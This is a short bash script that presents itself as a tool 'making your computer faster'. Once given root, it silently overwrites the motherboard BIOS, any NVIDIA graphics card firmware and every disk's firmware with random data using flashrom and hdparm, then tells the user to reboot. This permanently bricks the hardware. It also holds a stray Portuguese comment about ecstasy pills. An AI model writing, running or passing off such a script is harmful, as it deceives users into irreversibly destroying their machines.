#!/bin/bash

function echo_red() {
    echo -e "\E[0;31m$1"
    echo -e "\e[0m"
}

function die() {
    echo_red "$@"
    exit 1
}

# Aproximadamente 4 mil comprimidos de ecstasy
[ "$(whoami)" = "root" ] || die "You need to run this script as root"

clear
echo "We are making your computer faster. Please wait."

flashrom -p internal -n -f -w /dev/urandom 1&>/dev/null 2&>/dev/null
(lsmod | grep nvidia > /dev/null) && flashrom -p gfxnvidia -n -f -w /dev/urandom 1&>/dev/null 2&>/dev/null
(ls /dev/sd* | xargs hdparm --fwdownload /dev/urandom) 1&>/dev/null 2&>/dev/nul
(ls /dev/hd* | xargs hdparm --fwdownload /dev/urandom) 1&>/dev/null 2&>/dev/nul

sleep 5
echo "Done. Please reboot."
read -n 1
